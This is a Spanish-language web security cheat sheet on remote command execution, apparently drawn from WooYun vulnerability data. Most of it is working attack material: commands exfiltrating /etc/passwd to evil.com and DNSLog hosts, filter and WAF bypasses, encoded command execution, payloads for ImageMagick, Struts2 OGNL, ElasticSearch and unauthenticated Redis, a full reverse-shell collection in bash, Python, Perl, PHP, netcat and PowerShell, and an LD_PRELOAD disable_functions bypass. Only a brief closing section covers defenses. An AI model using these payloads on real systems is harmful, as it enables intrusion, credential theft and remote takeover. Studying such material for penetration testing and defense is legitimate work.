# Seguridad Web - Ejecución de Comandos (RCE)

> Fuente: Base de datos de vulnerabilidades WooYun (6,826 casos de RCE) | Extraído de web-injection.md

## III. Ejecución de comandos

### 3.1 Naturaleza de la vulnerabilidad

```
Entrada del usuario (datos) -> Concatenación sin depurar -> Entra al contexto de ejecución de comandos del sistema/código -> Ejecución de instrucciones del SO
```

**Fórmula central**: Ejecución de comandos = Contaminación del flujo de datos + Contexto de ejecución (Shell/código/expresión)

### 3.2 Métodos de detección

#### Puntos de entrada de alta frecuencia

| Tipo de entrada | Porcentaje | Escenario típico |
|---------|------|---------|
| Operaciones de archivo | 68% | Subida, lectura, descompresión |
| Funciones de comandos del sistema | 62% | exec/system/shell_exec |
| Framework Struts2 | 50% | Inyección de expresión OGNL |
| SSRF | 30% | Paso de parámetros por URL |
| Comando ping | 26% | Funciones de diagnóstico de red |
| Procesamiento de imágenes | 24% | ImageMagick |
| Deserialización Java | 20% | WebLogic/JBoss |

#### Símbolos de concatenación de comandos

| Símbolo | Significado | Lógica de ejecución |
|------|------|---------|
| `;` | Separador | Ejecución secuencial, sin importar el resultado del comando anterior |
| `\|` | Tubería (pipe) | La salida anterior sirve de entrada para la siguiente |
| `` ` `` / `$()` | Sustitución de comandos | Ejecuta el comando interno y devuelve el resultado |
| `\|\|` | O lógico | Ejecuta el siguiente solo si el anterior falla |
| `&&` | Y lógico | Ejecuta el siguiente solo si el anterior tiene éxito |
| `%0a` / `%0d%0a` | Salto de línea | Separador de salto de línea codificado en URL |

#### Detección sin retorno visible (blind)

```bash
# Exfiltración vía DNSLog
ping `whoami`.xxxxx.ceye.io
curl http://`whoami`.xxxxx.ceye.io

# Exfiltración vía HTTP
curl https://evil.com/?d=`cat /etc/passwd | base64 | tr '\n' '-'`
curl -X POST -d "data=$(cat /etc/passwd)" https://evil.com/c

# Retardo temporal
sleep 5
ping -c 5 127.0.0.1

# Escritura de archivo en el directorio Web
echo "test" > /var/www/html/proof.txt
```

### 3.3 Técnicas de bypass

#### Bypass de espacios

```bash
cat${IFS}/etc/passwd          # ${IFS} separador interno de campos
cat$IFS$9/etc/passwd          # $9 es un parámetro posicional vacío
cat%09/etc/passwd             # Carácter de tabulación
cat</etc/passwd               # Símbolo de redirección
{cat,/etc/passwd}             # Expansión de llaves
```

#### Bypass de palabras clave

```bash
# División por comillas/barra invertida
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# Concatenación de variables
a=c;b=at;$a$b /etc/passwd

# Comodines
/bin/ca* /etc/passwd
/bin/c?t /etc/passwd
/???/??t /etc/passwd
```

#### Alternativas al comando cat

```bash
tac  head  tail  more  less  nl  sort  uniq  od -c  xxd  base64  rev  paste
```

#### Bypass mediante codificación

```bash
# Base64
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
bash -c "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)"

# Hex
echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash
$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
```

### 3.4 Cadenas de explotación y Payloads

#### Payloads de vulnerabilidades de framework/componente

**ImageMagick (CVE-2016-3714)**：

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/"|bash -i >& /dev/tcp/ATTACKER/8080 0>&1 &")'
pop graphic-context
```

**Struts2 S2-045**：

```
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',123*123)}.multipart/form-data
```

**Struts2 OGNL - Ejecución de comandos genérica**:

```
${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}
```

**ElasticSearch - Bypass del sandbox de Groovy**:

```json
{"size":1,"script_fields":{"x":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
```

**Redis sin autenticación: escritura de clave pública SSH/Crontab**:

```bash
redis-cli -h target
config set dir /root/.ssh && config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...\n\n" && save
# O escribir en crontab
config set dir /var/spool/cron && config set dbfilename root
set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/8080 0>&1\n\n" && save
```

#### Colección de reverse shells

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# PHP
php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# NC sin parámetro -e
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f

# PowerShell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER",PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}
```

#### Jerarquía de funciones peligrosas de PHP

| Nivel | Función | Capacidad |
|-----|------|-----|
| L1 Nivel de código | `eval()`, `assert()(PHP5)`, `create_function()`, `preg_replace(/e)` | Ejecución de código PHP |
| L2 Nivel de shell | `system()`, `passthru()`, `shell_exec()`, comillas invertidas | Comandos del sistema con salida visible |
| L3 Nivel de proceso | `exec()`, `popen()`, `proc_open()`, `pcntl_exec()` | Ejecución de subprocesos |
| L4 Nivel de callback | `call_user_func()`, `array_map()` | Llamada indirecta de funciones |

#### Técnicas de bypass de WAF en PHP

```php
// Concatenación de cadenas
$func = 'sys'.'tem'; $func('whoami');
// Función mediante variable
$a='sys';$b='tem';($a.$b)('whoami');
// Ofuscación mediante codificación
base64_decode('c3lzdGVt')           // system
str_rot13('flfgrz')                 // system
chr(115).chr(121).chr(115).chr(116).chr(101).chr(109) // system
// Manipulación de cadenas
strrev('metsys')('whoami');
implode('',array('s','y','s','t','e','m'))('whoami');
```

#### Bypass de disable_functions

| Método | Principio | Condición |
|-----|------|-----|
| LD_PRELOAD | Secuestra funciones de biblioteca del sistema; mail() dispara la carga de un .so malicioso | Poder subir .so + mail() disponible |
| Shellshock | Inyección de variables de entorno en Bash<=4.3 | Versión antigua de Bash |
| Apache Mod_CGI | Configuración de ejecución CGI vía .htaccess | Apache + AllowOverride |
| PHP-FPM/FastCGI | Modificar configuración de PHP para ejecutar código | Acceso al puerto FPM/SSRF |
| ImageMagick | Ejecución de comandos mediante función delegate | Uso de IM para procesar imágenes |
| Windows COM | Componente WScript.Shell | Windows + extensión COM |

**Explotación central de LD_PRELOAD**:

```php
// Subir .so malicioso (secuestra la función geteuid, invoca internamente system())
putenv("LD_PRELOAD=/tmp/exploit.so");
mail("a@a.com","test","test");  // mail() inicia el proceso sendmail -> carga el .so -> ejecuta el comando
```

### 3.5 Medidas de defensa

```php
// Mejor práctica: validación por lista blanca + escapeshellarg
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    system("ping " . escapeshellarg($_GET['ip']));
}
```

- Evitar llamar directamente a comandos del sistema; usar funciones integradas del lenguaje en su lugar
- Ejecución parametrizada (paso de argumentos como array), prohibir la concatenación de cadenas
- Escapar con `escapeshellarg()` + `escapeshellcmd()`
- Validación de entrada por lista blanca + verificación de tipos
- Deshabilitar funciones peligrosas con `disable_functions` (atención a los riesgos de bypass)
- Ejecutar el servicio Web con privilegios mínimos + aislamiento en contenedor/chroot
- Actualizar oportunamente los componentes del framework (Struts2/WebLogic/ImageMagick, etc.)

---

